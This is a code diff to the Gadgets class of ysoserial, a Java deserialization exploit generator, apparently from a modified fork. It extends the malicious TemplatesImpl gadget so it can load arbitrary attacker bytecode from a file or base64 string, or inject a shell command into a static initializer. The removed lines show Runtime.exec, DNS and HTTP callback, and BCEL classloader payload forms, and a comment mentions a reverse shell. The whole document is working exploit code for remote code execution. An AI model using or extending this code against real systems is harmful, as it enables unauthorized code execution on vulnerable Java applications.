@@ -24,6 +24,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import sun.misc.BASE64Decoder;
+import ysoserial.payloads.custom.TemplatesImplUtil;
 
 
 /*
@@ -106,39 +108,28 @@ public class Gadgets {
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
         final T templates = tplClass.newInstance();
+        byte[] classBytes = null;
 
-        // use template gadget class
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = null;
-        if(command.toLowerCase().startsWith("sleep:")) {
-            int time = Integer.valueOf(command.substring(6)) * 1000;
-            cmd = String.format("java.lang.Thread.sleep(%sL);",time);
-        } else if(command.toLowerCase().startsWith("dnslog:")){
-            String dnslogDomain = command.substring(7);
-            cmd = String.format("java.net.InetAddress.getAllByName(\"%s\");",dnslogDomain);
-        } else if(command.toLowerCase().startsWith("httplog:")){
-            String httplogURL = command.substring(8);
-            cmd = String.format("new java.net.URL(\"%s\").getContent();",httplogURL);
-        } else if(command.toLowerCase().startsWith("bcel:")) {
-            String bcel = command.substring(5);
-            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",bcel);
-        }else {
-             cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
-                "\");";
+        if(command.toLowerCase().startsWith("classfile:")){
+            classBytes = CommonUtil.readFileByte(command.substring(10));
+        }else if(command.toLowerCase().startsWith("classbase64:")){
+            classBytes = new BASE64Decoder().decodeBuffer(command.substring(12));
+        } else {
+            // use template gadget class
+            ClassPool pool = ClassPool.getDefault();
+            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+            pool.insertClassPath(new ClassClassPath(abstTranslet));
+            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+            // run command in static initializer
+            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+            String cmd = TemplatesImplUtil.getCmd(command);
+            clazz.makeClassInitializer().insertAfter(cmd);
+            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+            clazz.setName("T" + System.nanoTime());
+            CtClass superC = pool.get(abstTranslet.getName());
+            clazz.setSuperclass(superC);
+            classBytes = clazz.toBytecode();
         }
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
-
-        final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
